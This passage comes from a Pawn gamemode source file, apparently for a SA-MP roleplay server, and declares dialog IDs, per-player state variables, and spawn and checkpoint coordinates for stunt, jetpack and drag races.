new PlayerText:quest_pTD[MAX_PLAYERS][7];

new QuestTimer[MAX_PLAYERS];

//===============================[ Dialozi ]==================================//

enum
{
	dialog_USLOVIKORISCENJA = 1,
	dialog_REGISTER,
	dialog_REGCONFRM,
	dialog_COUNTRY,
	dialog_AGE,
	dialog_MAIL,
	dialog_LOGIN,
	dialog_SETTINGS,
	dialog_CHANGEPASSWORD,
	dialog_CHANGEEMAIL,
	dialog_CHANGEAGE,
	dialog_CHANGESPOL,
	dialog_CHANGECOUNTRY,
	dialog_HELP,
	dialog_MARKETBUY,
	dialog_SERVERMI,
	dialog_NAPRAVISVE,
	dialog_IZBRISISVE,
	dialog_LIDER,
	dialog_UBACIUORG,
	dialog_IZBACIIZORG,
	dialog_DODELIRANK,
	dialog_SVICLANOVI,
	dialog_IZMENISVE,
	dialog_ORGCREATE,
	dialog_ORGDELETE,
	dialog_ORGTIP,
	dialog_ORGRANK1,
	dialog_ORGRANK2,
	dialog_ORGRANK3,
	dialog_ORGRANK4,
	dialog_ORGRANK5,
	dialog_ORGRANK6,
	dialog_ORGINT1,
	dialog_ORGINT2,
	dialog_ORGEDIT,
	dialog_ORGNAME,
	dialog_ORGRANKS,
	dialog_BUYWATCH,
	dialog_CLUCKIN,
	dialog_RESTORAN,
	dialog_PIZZA,
	dialog_BURG,
	dialog_DRINK,
	dialog_GUNSHOP,
	dialog_FNAME,
	dialog_FEDIT,
	dialog_FSELL,
	dialog_FOPEN,
	dialog_FCLOSE,
	dialog_ZPOENI,
	dialog_PCREATE,
	dialog_VCREATE,
	dialog_ADMINCODE,
	dialog_RADIO,
	dialog_RENTANJE,
	dialog_PROMOTERVEH,
	dialog_YTVEH,
	dialog_PROPERTYWEPTAKE,
	dialog_JOBLIST,
	dialog_BUY_GPS,
	dialog_GPS,
	dialog_FCREATE,
	dialog_FIRMA,
	dialog_FOMONEY,
	dialog_FPMONEY,
	dialog_FLOCK,
	dialog_FCNAME,
	dialog_ORGSPISAK,
	dialog_ORGLIST,
	dialog_IMCREATE,
	dialog_SEARCH_NAME,
	dialog_SEARCH_NUMBERPLATE,
	dialog_POSTAVIPOTERU,
	dialog_OCISTIDOSIJE,
	dialog_OPREMA,
	dialog_VEHICLEWEPTAKE,
	dialog_MUNIFORM,
	dialog_KIOSK,
	dialog_SPAWNCHANGE,
	dialog_PAYDAY,
	dialog_KREDIT,
	dialog_INFOKREDIT,
	dialog_PROMENARATEKREDITA,
	dialog_FDELETE,
	dialog_IMDELETE,
	dialog_OVCREATE,
	dialog_GPS_FIND,
	dialog_VEDIT,
	dialog_VPRICE,
	dialog_ICPRICE,
	dialog_IOPEN,
	dialog_ICLOSE,
	dialog_ISELL,
	dialog_ORGSKINS,
	dialog_IEDIT,
	dialog_WAR,
	dialog_WAR_ZAKAZI_1,
	dialog_WAR_ZAKAZI_2,
	dialog_WAR_ZAKAZI_3,
	dialog_WAR_ZAKAZI_4,
	dialog_WAR_ZAKAZI_5,
	dialog_WAR_ZAKAZI_6,
	dialog_WAR_ZAKAZI_7,
	dialog_WAR_ZAKAZI_8,
	dialog_WAR_ZAKAZI_9,
	dialog_WARUBACI,
	dialog_WARIZBACI,
	dialog_VIP,
	dialog_ORGPREFIX,
	dialog_VCOLOR,
	dialog_OFFIZBACIIZORG,
	dialog_ORGDUTYP,
	dialog_ORGDILER,
	dialog_ORGEQUIPP,
	dialog_ORGSPAWNP,
	dialog_ORGPORT,
	dialog_PROPERTYLIST,
	dialog_PROPCHOSEN,
	dialog_PROPUNAPREDI,
	dialog_ASCONNECTBUSSINES,
	dialog_SAFEPUTDRUG,
	dialog_SAFETAKEDRUG,
	dialog_SAFEALL,
	dialog_PROPSELLTP,
	dialog_ACCEPTPROP,
	dialog_ACCEPTFRIMA,
	dialog_FIRMASELLTP,
	dialog_ASMODEL,
	dialog_ASMAXMODEL,
	dialog_VEHCHOSEN,
	dialog_VEHLIST,
	dialog_VEHICLETAKEDRUG,
	dialog_VEHICLEPUTDRUG,
	dialog_GEPEKIZVADI,
	dialog_IVCREATE,
	dialog_PORTABLE,
	dialog_GIVEHIT,
	dialog_HORDER,
	dialog_RESETIRAJ,
	dialog_PROPSELLDRZAVA,
	dialog_FIRMASELLDRZAVA,
	dialog_POLVCREATE,
	dialog_POREZ,
	dialog_POREZPAY,
	dialog_CREATEGATE,
	dialog_CREATEGATE_2,
	dialog_CREATEGATE_3,
	dialog_CREATEGATE_4,
	dialog_CREATEGATE_5,
	dialog_CREATEGATE_6,
	dialog_ORGZSKINS,
	dialog_CREATEVEH,
	dialog_GRCREATE,
	dialog_ORGMAXMEMB,
	dialog_PILOT,
	dialog_GEPEK,
	dialog_GEPEKOSTAVI,
	dialog_HAPPYHOURS,
	dialog_HAPPYJOBS,
	dialog_SERVERSTATS,
	dialog_SERVERSTATS_2,
	dialog_SERVERSTATS_3,
	dialog_SERVERSTATS_4,
	dialog_CREATEGPS,
	dialog_GPSEDIT,
	dialog_IZMENAIMENAGPS,
	dialog_IZMENAIMENAGPS2,
	dialog_IZMENAPOZGPS,
	dialog_CREATEJOBBUSSINES,
	dialog_BACKPACK,
	dialog_BACKPACK_2,
	dialog_BACKPACKTAKEGUN_1,
	dialog_BACKPACKTAKEGUN_2,
	dialog_BACKPACKTAKEGUN_3,
	dialog_ORG,
	dialog_INVLIST_ADMIN,
	dialog_PRCREATE,
	dialog_ASAMMOUNT,
	dialog_SELECTVGUN,
	dialog_TUNING,
	dialog_TUNING_2,
	dialog_VVCREATE,
	dialog_UBACIUORG_2,
	dialog_AUTOSEDIT,
	dialog_ASEDITAMMOUNT,
	dialog_VERIFIKACIJA,
	dialog_CCTV,
	dialog_RADIOPLAY,
	dialog_IZAZOVITRKA,
	dialog_ORGSAFE,
	dialog_ORGSAFEPUT,
	dialog_ORGSAFETAKE,
	dialog_ORGSAFETMONEY,
	dialog_ORGSAFEPDRUG,
	dialog_ORGSAFETDRUG,
	dialog_ORGSAFEPMONEY,
	dialog_VEHCOLOR,
	dialog_VEHSELLTP,
	dialog_ACCEPTVEH,
	dialog_ASKLISTA,
	dialog_ASKLISTA_2,
	dialog_RENTABLE,
	dialog_PROPTAKEMONEY,
	dialog_PROPPUTMONEY,
	//
	dialog_ZAMENA_2,
	dialog_ZAMENA_3,
	dialog_ZAMENA_4,
	dialog_DONATORBOJA,
	dialog_GANGZCOLOR,
	dialog_GANGZRADIUS,
	dialog_ORGCOLOR,
	dialog_GANGZEDIT,
	dialog_GANGZCOLOREDIT,
	dialog_GANGZID,
	dialog_GANGZISPOPULAR,
	dialog_SAVEZ,
	dialog_VEHMONEYBUY,
	dialog_IZABERITABLICE,
	dialog_IZABERITABLICE_2,
	dialog_VEHICLETAKEMATS,
	dialog_VEHICLEPUTMATS,
	dialog_SAFEPUTMATS,
	dialog_SAFETAKEMATS,
	dialog_FCORDEXIT,
	dialog_FEDITTYPE,
	dialog_NEONSHOP,
	dialog_CLOTHES,
	dialog_CLOTHESMENU,
	dialog_STATISTIKAIGRACA,
	dialog_TELEPORTS,
	dialog_ports_MAIN,
	dialog_ports_JOBS,
	dialog_ports_ORGS,
	dialog_ports_MISSIONS,
	dialog_VEHLIST_ADMIN,
	dialog_VEHCHOSEN_ADMIN,
	dialog_VEHSLOTSET_ADMIN,
	dialog_VEHLIST_START,
	dialog_IGRAONICA,
	dialog_NFSIZAZOVI,
	dialog_ORGSAFEPMATS,
	dialog_ORGSAFETMATS,
	dialog_OFFSELLVEH,
	dialog_VEHSELLDRZAVI,
	dialog_KAZNIIGRACA,
	dialog_BLACKMARKET,
	dialog_BLACKMARKET_1,
	dialog_MAKEGUN,
	dialog_MAKEGUN_1,
	dialog_STARTPAKET,
	dialog_APPEAL,
	dialog_DILER,
	dialog_DILERCENA,
	dialog_RUDAR,
	dialog_GOVATTACHS,
	dialog_LEADERBUYBIZZ,
	dialog_ORGBIZZSELL,
	dialog_ORGFIRMA,
	dialog_OFLOCK,
	dialog_OFCNAME,
	dialog_OFOMONEY,
	dialog_OFPMONEY,
	dialog_ORGBENTRANCE,
	dialog_EASYQUEST,
	dialog_POSAOSKILLS,
	dialog_TOPLISTA,
	dialog_TEXTDRAWOVI,
	dialog_DONATE,
	dialog_XBON,
	dialog_PAYSAFE,
	dialog_SECURERCON,
	dialog_LIVEEVENT,
	dialog_LIVEGUNS,
	dialog_BAIL
};

//================================[ Newovi ]==================================//

new gLastDriver[ MAX_VEHICLES ],
	Neon[ MAX_VEHICLES ],
	NeonObject1[ MAX_VEHICLES ],
	NeonObject2[ MAX_VEHICLES ],
	VehicleWindows[ MAX_VEHICLES ],
	Text3D:vehicle3Dtext[ MAX_VEHICLES ],
	CarSign[ MAX_VEHICLES ],
	bool:occupied[ MAX_VEHICLES ] = false,
	vCanDrive[ MAX_VEHICLES ],
	Siren[MAX_VEHICLES],
    SirenObject[MAX_VEHICLES],
    bool:KutijaMatsa[ MAX_VEHICLES ],
    bool:DragRaceAttachs[MAX_VEHICLES],
    DragRaceAttach[MAX_VEHICLES][11];

	#if ZIMSKI_MOD == 1

		new snowStreet[821];

    #endif

new bool:usingAME[MAX_PLAYERS];

/* __________________________________________________________________________ */
/* __________________________________________________________________________ */

new timeshift                    = 0,
	ghour                        = 0,
	gminute                      = 0,
    gsecond                      = 0,
    levelexp                     = 4,
    smscost                      = 10,
    cchargetime                  = 60,
    callcost                     = 4,
	adds                    	 = 0,
	bool:ToggedG                 = true,
	bool:ToggedN                 = true,
	bool:ToggedL                 = true,

	bool:ToggedWeekend           = false,
	//
	shifthour,
	carspawntimer,
    KoriscenaReklama;

new DialogStrgEx[ 2048 ],
	globalstring[ 128 ],
	GovRepairCooldown[MAX_PLAYERS] = 0,
	bool:RequestingBackup[MAX_PLAYERS] = false,
	bool:CuffTimerCalled[MAX_PLAYERS] = false,
	bool:PokusajProvala[MAX_PLAYERS] = false,
	TicketOffer[MAX_PLAYERS] = -1,
	TicketMoney[MAX_PLAYERS] = 0,
	ShakeOffer[MAX_PLAYERS] = -1,
	ShakeStyle[MAX_PLAYERS] = 0,
	Mobile[MAX_PLAYERS] = -1,
	CellTime[MAX_PLAYERS] = 0,
	CallCost[MAX_PLAYERS] = 0,
	PlayerDruggedSeconds[MAX_PLAYERS] = 0,
	bool:LocatingCar[MAX_PLAYERS] = false,
	bool:GPSTimerCalled[MAX_PLAYERS] = false,
	bool:StartingVehicle[MAX_PLAYERS] = false,
	bool:PoliceComputer[MAX_PLAYERS] = false,
	bool:JobDuty[MAX_PLAYERS] = false,
	bool:ImmobTimerCalled[MAX_PLAYERS] = false,
	bool:OfficerUndercover[MAX_PLAYERS] = false,
	gSmoking[MAX_PLAYERS] = 0;

new EngineStartTimer[MAX_PLAYERS],
	immobcounttimer[MAX_PLAYERS],
	BreakLockTimer[MAX_PLAYERS],
	breakcounttimer[MAX_PLAYERS],
	BreakingVehicle[MAX_PLAYERS],
	BreakLockTimerCalled[MAX_PLAYERS],
	BreakingLock[MAX_PLAYERS],
	breaksecounds[MAX_PLAYERS],
	immobsecounds[MAX_PLAYERS];

new bool:ToggedPM[MAX_PLAYERS] = false,
	bool:ToggedWISP[MAX_PLAYERS] = false,
	bool:ToggedFR[MAX_PLAYERS] = false;

new bool:PoliceDuty[ MAX_PLAYERS ];

new lastweapon[ MAX_PLAYERS ][ 2 ];
new ReportGlobal[ MAX_PLAYERS ],
    PitajTajmer[ MAX_PLAYERS ],
    playerStatsPage[ MAX_PLAYERS ],
    playerStatsTargetID[ MAX_PLAYERS ],
    PosaoPMunicijeCP[ MAX_PLAYERS ],
    PosaoPMunicijeTable[ MAX_PLAYERS ],
	PosaoPNovcaCP[ MAX_PLAYERS ],
	PosaoUberCP[MAX_PLAYERS],
	PosaoPNamjestajaCP[MAX_PLAYERS],
	bool:PosaoMehanicarCP[ MAX_PLAYERS ],
	bool:OkacioTrailer[ MAX_PLAYERS ],
    CooldownPort[ MAX_PLAYERS ],
	PlacaPorez[ MAX_PLAYERS ],
	NewGlobal[ MAX_PLAYERS ];

new Training[ MAX_PLAYERS ];
new bool:PlayerLogged[ MAX_PLAYERS ];
new EditKontejnera[ MAX_PLAYERS ],
    EditPresents[ MAX_PLAYERS ],
    EditCTrees[ MAX_PLAYERS ],
	EditATM[ MAX_PLAYERS ];

new ChosenJob[ MAX_PLAYERS ],
    LetZG[ MAX_PLAYERS ],
    PilotTimer[ MAX_PLAYERS ],
    LetSA[ MAX_PLAYERS ],
	AlreadyRefreshed[ MAX_PLAYERS ],
	Float:PlayerCruiseSpeed[ MAX_PLAYERS ],
	Float:PlayerHeadingAngle[ MAX_PLAYERS ],
	bool:Tempomat[ MAX_PLAYERS ],
	ChosenWeapon[ MAX_PLAYERS ],
	bool:PlayerFreezed[ MAX_PLAYERS ],
	bool:IgracNosiPaket[ MAX_PLAYERS ];

new CheckpointStatus[ MAX_PLAYERS ],
    ZlatoVreme[ MAX_PLAYERS ],
    MarkerPaket[ MAX_PLAYERS ],
    PljackanjeZlatareTimer[ MAX_PLAYERS ],
    PljackaZlato[ MAX_PLAYERS ],
    PljackanjeBankeTimer[ MAX_PLAYERS ],
	PljackaVreme[ MAX_PLAYERS ],
	PljackaNovac[ MAX_PLAYERS ];

new Sex_Lisa, bool:WhoreLisa,
	Sex_Angelina, bool:WhoreAngelina,
	Sex_Mia, bool:WhoreMia,
	Sex_Sendy, bool:WhoreSendy;

new reactionMoney,
	reactionMessage[ 2 ][ 128 ],
	bool:reactionWon,
	reactionWinner[ MAX_PLAYER_NAME ],
	reactionTest,
	reactionTime = 0;
	
new matka,
	rezultat,
	ranbroj[4],

Korijeni[][] = 
{
	{36, 6},
	{49, 7},
	{81, 9},
	{144, 12},
	{225, 15},
	{16, 4},
	{169, 13},
	{196, 14},
	{256, 16},
	{9, 3},
	{4, 2},
	{100, 10},
	{1, 1},
	{144, 12},
	{25, 5},
	{64, 8},
	{121, 11}
};

new Float:Degree[ MAX_PLAYERS ];
const Float:SelfieRadius = 1.4;
const Float:SelfieSpeed  = 1.25;
const Float:SelfieHeight = 1.0;
new Float:lX[ MAX_PLAYERS ];
new Float:lY[ MAX_PLAYERS ];
new Float:lZ[ MAX_PLAYERS ];

/* __________________________________________________________________________ */

new Float:RandomEStuntRace[ 20 ][ 4 ] = 
{
    { -8.3110,3425.4500,5.1132,270.3274 },
    { -8.3110,3419.7500,5.1132,270.3274 },
    
    { -15.3110,3425.4500,5.1132,270.3274 },
    { -15.3110,3419.7500,5.1132,270.3274 },
    
    { -22.3110,3425.4500,5.1132,270.3274 },
    { -22.3110,3419.7500,5.1132,270.3274 },
    
    { -29.3110,3425.4500,5.1132,270.3274 },
    { -29.3110,3419.7500,5.1132,270.3274 },
    
    { -36.3110,3425.4500,5.1132,270.3274 },
    { -36.3110,3419.7500,5.1132,270.3274 },
    
    { -43.3110,3425.4500,5.1132,270.3274 },
    { -43.3110,3419.7500,5.1132,270.3274 },
    
    { -50.3110,3425.4500,5.1132,270.3274 },
    { -50.3110,3419.7500,5.1132,270.3274 },
    
    { -57.3110,3425.4500,5.1132,270.3274 },
    { -57.3110,3419.7500,5.1132,270.3274 },

    { -64.3110,3425.4500,5.1132,270.3274 },
    { -64.3110,3419.7500,5.1132,270.3274 },

    { -71.3110,3425.4500,5.1132,270.3274 },
    { -71.3110,3419.7500,5.1132,270.3274 }
};

new Float:StuntRace_CP[][] =
{
	{121.96,		 	3422.62, 		7.49},
	{262.83,		 	3422.62, 		40.86},
	{295.66,		 	3422.62, 		82.13},
	{332.11,		 	3257.69, 		81.25},
	{299.93,		 	3337.11, 		62.03},
	{311.17,		 	3475.42, 		62.03},
	{311.17,		 	3647.12, 		84.18},
	{322.48,		 	3698.05, 		125.61},
	{29.69,		 		3698.05, 		27.91},
	{73.18,		 		3666.20, 		32.08},
	{241.21,		 	3679.01, 		31.72},
	{241.21,		 	3369.28, 		31.72},
	{159.44,		 	3298.87, 		108.01},
	{159.44,		 	3440.01, 		84.34},
	{159.44,		 	3514.15, 		60.68},
	{159.44,		 	3679.18, 		82.83},
	{247.58,		 	3739.98, 		71.60},
	{235.02,		 	3607.64, 		67.86},
	{174.86,		 	3494.73, 		67.86},
	{130.26,		 	3406.86, 		52.24},
	{119.19,		 	3362.98, 		40.44},
	{108.01,		 	3304.27, 		35.76},
	{123.23,            3217.41,        35.76},
	{139.88,		 	3341.60, 		16.22},
	{183.17,		 	3456.39, 		16.22},
	{110.25,		 	3498.03, 		11.18}
};

//

new Float:RandomEJPR[ 20 ][ 4 ] =
{
    { -2150.4387,1082.6481,79.8467,358.2420 },
    { -2146.4387,1082.6481,79.8467,358.2420 },
    { -2143.4387,1082.6481,79.8467,358.2420 },
    { -2140.4387,1082.6481,79.8467,358.2420 },
    { -2136.4387,1082.6481,79.8467,358.2420 },

    { -2150.4387,1075.6481,79.8467,358.2420 },
    { -2146.4387,1075.6481,79.8467,358.2420 },
    { -2143.4387,1075.6481,79.8467,358.2420 },
    { -2140.4387,1075.6481,79.8467,358.2420 },
    { -2136.4387,1075.6481,79.8467,358.2420 },
    
    { -2150.4387,1068.6481,79.8467,358.2420 },
    { -2146.4387,1068.6481,79.8467,358.2420 },
    { -2143.4387,1068.6481,79.8467,358.2420 },
    { -2140.4387,1068.6481,79.8467,358.2420 },
    { -2136.4387,1068.6481,79.8467,358.2420 },
    
    { -2150.4387,1061.6481,79.8467,358.2420 },
    { -2146.4387,1061.6481,79.8467,358.2420 },
    { -2143.4387,1061.6481,79.8467,358.2420 },
    { -2140.4387,1061.6481,79.8467,358.2420 },
    { -2136.4387,1061.6481,79.8467,358.2420 }
};

new Float:JetpackRace_CP[][] =
{
	{ -2159.3145,	1177.3975,	63.3576 },
	{ -2179.3506,	1238.1396,	39.0595 },
	{ -2179.3506,	1238.1396,	39.0595 },
	{ -2103.1238,	1263.7271,	30.0263 },
	{ -2001.6952,	1262.7451,	54.5954 },
	{ -1876.5679,	1283.3114,	62.4844 },
	{ -1855.6968,	1290.6819,	53.6010 },
	{ -1763.4965,	1302.8912,	58.2893 },
	{ -1616.9059,	1316.5248,	0.7419 },
	{ -1577.5100,	1290.6588,	15.1715 },
	{ -1572.4575,	1234.1174,	8.5060 },
	{ -1606.3325,	1147.3136,	19.2601 },
	{ -1649.3190,	1097.8738,	32.9906 },
	{ -1671.4934,	1044.2999,	37.1584 },
	{ -1670.1945,	1007.0786,	75.1048 },
	{ -1711.5997,	1002.0516,	81.3913 },
	{ -1755.9413,	983.8019,	100.8446 },
	{ -1851.8641,	957.4097,	96.4041 },
	{ -2129.6611,	921.0525,	85.4812 },
	{ -2286.4717,	916.2509,	96.8359 },
	{ -2478.3816,	909.7076,	86.2881 },
	{ -2692.3645,	894.3287,	86.1717 },
	{ -2749.9600,	994.6613,	66.3299 },
	{ -2722.4609,	1137.6046,	44.2112 },
	{ -2687.1897,	1316.1841,	56.4472 },
	{ -2683.1101,	1595.0674,	96.8545 },
	{ -2681.5698,	1926.7910,	126.9804 }
};

//

new Float:RandomEDragRace[ 20 ][ 4 ] = 
{
    { 1803.6300,980.5828,6.6329,0.5164 },
    { 1809.3300,980.5828,6.6271,0.5164 },

    { 1803.6300,970.5828,6.6329,0.5164 },
    { 1809.3300,970.5828,6.6271,0.5164 },

    { 1803.6300,960.5828,6.6329,0.5164 },
    { 1809.3300,960.5828,6.6271,0.5164 },

    { 1803.6300,950.5828,6.6329,0.5164 },
    { 1809.3300,950.5828,6.6271,0.5164 },

    { 1803.6300,940.5828,6.6329,0.5164 },
    { 1809.3300,940.5828,6.6271,0.5164 },

    { 1803.6300,930.5828,6.6329,0.5164 },
    { 1809.3300,930.5828,6.6271,0.5164 },

    { 1803.6300,920.5828,6.6329,0.5164 },
    { 1809.3300,920.5828,6.6271,0.5164 },

    { 1803.6300,910.5828,6.6329,0.5164 },
    { 1809.3300,910.5828,6.6271,0.5164 },

    { 1803.6300,900.5828,6.6329,0.5164 },
    { 1809.3300,900.5828,6.6271,0.5164 },

    { 1803.6300,890.5828,6.6329,0.5164 },
    { 1809.3300,890.5828,6.6271,0.5164 }
};

new Float:DragRace_CP[][] =
{
	{ 1806.3884,	1242.7373,	6.5380 },
	{ 1806.2440,	1679.8118,	6.5419 },
	{ 1806.9409,	2036.4613,	3.7137 },
	{ 1816.6777,	2429.6331,	11.3134 },
	{ 1620.8258,	2510.3608,	8.1253 },
	{ 1299.2893,	2435.1140,	6.5378 },
	{ 1208.5612,	2169.8960,	6.5372 },
	{ 1208.3427,	1718.3550,	6.5418 },
	{ 1208.3938,	1259.6687,	6.5413 },
	{ 1309.5823,	863.6745,	6.6152 },
	{ 1613.9199,	834.4359,	6.5414 },
	{ 2066.0867,	833.8307,	6.5441 },
	{ 2397.8684,	834.2305,	6.5418 },
	{ 2681.1602,	967.0096,	6.5424 },
	{ 2726.4622,	1555.3921,	6.5381 },
	{ 2726.5334,	2023.9336,	6.5383 },
	{ 2608.9807,	2544.4932,	5.5906 },
	{ 2278.2639,	2625.6196,	6.5536 },
	{ 1814.6068,	2506.1658,	6.6228 },
	{ 1287.8296,	2473.5781,	7.4955 },
	{ 1050.6841,	2530.4705,	10.4327 },
	{ 976.4415,		2579.7446,	10.3824 }
};

/* __________________________________________________________________________ */

#if ZIMSKI_MOD == 1

	new SnowObject[ MAX_PLAYERS ],
		bool:Snow[ MAX_PLAYERS ],
		bool:Snow_F[ MAX_PLAYERS ];

	new PlayerRun[ MAX_PLAYERS ],
		action_effect[ MAX_PLAYERS ];

	new GrudvanjeTimer[MAX_PLAYERS];

#endif

/* __________________________________________________________________________ */

new cruise_control[MAX_PLAYERS],
	pocetni_intro[MAX_PLAYERS],
	_progressatmbar[MAX_PLAYERS],
	tazovan_tajmer[MAX_PLAYERS],
	_backupclear[MAX_PLAYERS];

/* __________________________________________________________________________ */

new Obj[ MAX_PLAYERS ];
new Shoot[ MAX_PLAYERS ];
new bool:AlreadyShooted[ MAX_PLAYERS ];
new Charged[ MAX_PLAYERS ];

new CreateRentID[ MAX_PLAYERS ],
	ClothesSlots[ MAX_PLAYERS ][ 4 ],
    Putovar[ MAX_PLAYERS ],
    bool:Putovara[ MAX_PLAYERS ],
    Pistovar[ MAX_PLAYERS ],
    bool:Pistovara[ MAX_PLAYERS ],
    UKLJUCENIFCHAT[ MAX_PLAYERS ],
    BikeBH[ MAX_PLAYERS ],
 	KupljeneFakture[ MAX_PLAYERS ],
    bool:takingselfie[ MAX_PLAYERS ],
    PlayerInBlowJob[ MAX_PLAYERS ],
    BlowJobCount[ MAX_PLAYERS ],
    PusenjeTimer[ MAX_PLAYERS ],
    IzabraniAskQ[ MAX_PLAYERS ],
    IDVozilaKojimSverca[ MAX_PLAYERS ],
    ProcesSvercanja[ MAX_PLAYERS ],
    DropedGun[ MAX_PLAYERS ],
    BrojLisica[ MAX_PLAYERS ],
    TazerMetkovi[ MAX_PLAYERS ],
    PoljeDroge[ MAX_PLAYERS ],
    ChosenItem[ MAX_PLAYERS ],
    ItemPrice[ MAX_PLAYERS ],
    ItemQuantity[ MAX_PLAYERS ],
    GiveItemID[ MAX_PLAYERS ],
    AdminVozilo[ MAX_PLAYERS ],
    AdminDialog[ MAX_PLAYERS ],
    VipVozilo[ MAX_PLAYERS ],
    PromoterVozilo[MAX_PLAYERS],
    YTVozilo[MAX_PLAYERS],
    PosaoVozilo[ MAX_PLAYERS ],
    PosaoTrailer[ MAX_PLAYERS ],
    TrkaVozilo[ MAX_PLAYERS ],
    SpawnovaoVozilo[ MAX_PLAYERS ],
    IzazivanjeTimer[ MAX_PLAYERS ],
    Krugovi[ MAX_PLAYERS ],
    TrkaCheckpoint[ MAX_PLAYERS ],
	TrkaIzazov[ MAX_PLAYERS ],
	bool:NaDmEventu[ MAX_PLAYERS ],
	bool:NaUtrci[ MAX_PLAYERS ],
    bool:ShowedRegister[ MAX_PLAYERS ],
    bool:ShowedLogin[ MAX_PLAYERS ],
    CheckingRegAcc[ MAX_PLAYERS ],
    bool:usingAnimation[ MAX_PLAYERS ],
	DragedPlayerID[ MAX_PLAYERS ],
	Draged[ MAX_PLAYERS ],
	DragTimer[ MAX_PLAYERS ],
    ShowedATMTD[ MAX_PLAYERS ],
    gpsid[ MAX_PLAYERS ],
    ServerStatsChose[ MAX_PLAYERS ];

//-- NEWS

new EndWood[ MAX_PLAYERS ];
//new playerRegCharacter;
new bool:InputPassword[ MAX_PLAYERS ],
    bool:InputMail[ MAX_PLAYERS ],
	ChoseCountry[ MAX_PLAYERS ],
	InputAge[ MAX_PLAYERS ],
	RegSex[ MAX_PLAYERS ],
	BiraSkin[MAX_PLAYERS];
new GlobalProdaja[ MAX_PLAYERS ],
	bool:GlobalImovinaIgracu[MAX_PLAYERS],
    Ponudjeno[ MAX_PLAYERS ],
	Trazio[ MAX_PLAYERS ],
	VehicleOffSaleVehID[ MAX_PLAYERS ],
	GlobalCena[ MAX_PLAYERS ],
	GlobalID_2[ MAX_PLAYERS ],
	GlobalID[ MAX_PLAYERS ];
new Spectate[ MAX_PLAYERS ];
new MarriageCeremoney[ MAX_PLAYERS char ];
new ProposeOffer[ MAX_PLAYERS ],
	DivorceOffer[ MAX_PLAYERS ];
new ProposedTo[ MAX_PLAYERS ];
new GotProposedBy[ MAX_PLAYERS ];
new WatchingTV[MAX_PLAYERS char];
new bool:AdminDuty[ MAX_PLAYERS ],
    MinutiIgraca[ MAX_PLAYERS ],
    IzabraniPort[ MAX_PLAYERS ],
    ChosenVehicle[ MAX_PLAYERS ],
    ChosenPlayerVeh[ MAX_PLAYERS ],
	bool:PlayerCPShow[ MAX_PLAYERS ],
    PhoneOnline[ MAX_PLAYERS ],
    Float:SpecPos[ MAX_PLAYERS ][ 3 ],
	SpecVW[ MAX_PLAYERS ],
	SpecInt[ MAX_PLAYERS ],
    Float:PozicijaWAR[ MAX_PLAYERS ][ 3 ],
    VirtualWWAR[ MAX_PLAYERS ],
	InteriorWAR[ MAX_PLAYERS ],
    KreiranjeWara[ MAX_PLAYERS ],
	RPTeacherDuty[ MAX_PLAYERS ];

new TrashLimit[ MAX_PLAYERS ],
	TrashTimer[ MAX_PLAYERS ],
   	TrashSearch[ MAX_PLAYERS ];

new PropertySafeGun[ MAX_PLAYERS ],
	PaketType[ MAX_PLAYERS ],
	bool:NosiPaketOruzja[ MAX_PLAYERS ];

new chosen_clothes_slot[ MAX_PLAYERS ],
	bool:object_on_player[ MAX_PLAYERS ][ 4 ];

new DailyRecord;

new BankTargets[3],
	BankActors[2],
	BankDoor[5],
	bool:BankDoorOpened[3],
	BankaOpljackana,
	bool:PljackaUToku,
	//
	ZlataraActors[2],
	bool:ZlataraUToku,
	ZlataraOpljackana,
	//
	GlobalnoPetnaestMinuta,
	NestoPljackano;

new Interiors[7];
new ChosenProperty[ MAX_PLAYERS ];
new cseconds, 
	cstring[6];

new	TacanOdgovor[ MAX_PLAYERS ],
	RentVozilo[ MAX_PLAYERS ],
	TrunkVehicle[ MAX_PLAYERS ],
	PlayerCuffed[ MAX_PLAYERS ],
	PosaoRudar[ MAX_PLAYERS ],
	bool:PlayerDrugged[ MAX_PLAYERS ],
	bool:tdm_tds_showed[ MAX_PLAYERS ],
	tdm_tds_showed_sec[ MAX_PLAYERS ],
	bool:PlayerTuningCar[ MAX_PLAYERS ],
    bool:BuyCarTDShowed[ MAX_PLAYERS ],
	bool:PocetniIntroStartovan[MAX_PLAYERS],
	bool:playerInIntro[MAX_PLAYERS],
	bool:LaptopRuke[ MAX_PLAYERS ],
	bool:VecjeUsao[ MAX_PLAYERS ],
	PlayerCode[ MAX_PLAYERS ],
	bool:TogHud[ MAX_PLAYERS ],
	bool:IgracZavezan[ MAX_PLAYERS ],
	bool:AccountVerified[ MAX_PLAYERS ],
	bool:KnockedDown[ MAX_PLAYERS ],
	bool:IgracOpljackan[ MAX_PLAYERS ],
	bool:Pojas[ MAX_PLAYERS ],
	bool:Uze[ MAX_PLAYERS ],
	SearchNadji[ MAX_PLAYERS ],
	bool:ImaTazer[ MAX_PLAYERS ];

new gNews[ MAX_PLAYERS char ];
new Odbrojavanje[ MAX_PLAYERS ];
new RentTimer[ MAX_PLAYERS ];
new bool:UzeoOpremu[ MAX_PLAYERS ];
new StaroVreme[ MAX_PLAYERS ],
    NovoVreme[ MAX_PLAYERS ];

new UzeoIzMarketa[ MAX_PLAYERS ][ 10 ],
	UkupnaCena[ MAX_PLAYERS ];

new PonudioIgrac[ MAX_PLAYERS ];
new ModelTrke[ MAX_PLAYERS ];
new UlogTrke[ MAX_PLAYERS ];
new inProperty[ MAX_PLAYERS ],
    inOrgInt[ MAX_PLAYERS ],
    uInterijeru[ MAX_PLAYERS ],
	uFirmi[ MAX_PLAYERS ];

new CenaProdaje[ MAX_PLAYERS ];
new bool:EditingBody[ MAX_PLAYERS ];
new RadioAktiviran[ MAX_PLAYERS ];
new UsaoAutoProdaja[ MAX_PLAYERS ];
new bool:first_spawn[ MAX_PLAYERS ];
new bool:clothes_load[ MAX_PLAYERS ],
	bool:quests_load[MAX_PLAYERS],
	bool:skills_load[MAX_PLAYERS];
new OrgKreiranje[ MAX_PLAYERS ];
new PokusajLogina[ MAX_PLAYERS ];
new LoginTime[ MAX_PLAYERS ];
new bool:login_showed[ MAX_PLAYERS ];

static const anim_libs[134][13] =
{
	"AIRPORT",      "ATTRACTORS",   "BAR",          "BASEBALL",     "BD_FIRE",
	"BEACH",        "BENCHPRESS",   "BF_INJECTION", "BIKE_DBZ",     "BIKED",
	"BIKEH",        "BIKELEAP",     "BIKES",        "BIKEV",        "BLOWJOBZ",
	"BMX",          "BOMBER",       "BOX",          "BSKTBALL",     "BUDDY",
	"BUS",          "CAMERA",       "CAR",          "CAR_CHAT",     "CARRY",
